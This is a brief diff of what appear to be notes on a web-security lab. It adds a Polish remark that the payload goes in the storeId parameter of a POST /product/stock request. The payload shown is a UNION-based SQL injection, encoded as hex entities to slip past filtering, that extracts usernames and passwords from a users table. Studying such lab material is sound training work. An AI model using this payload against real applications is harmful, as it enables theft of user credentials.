@@ -230,7 +230,7 @@ POST /product/stock HTTP/2
 
 
 
-payload
+payload - ma byc umieszczony w storeId
 
 <@hex_entities>1 UNION SELECT username || '~' || password FROM users</@hex_entities>
 
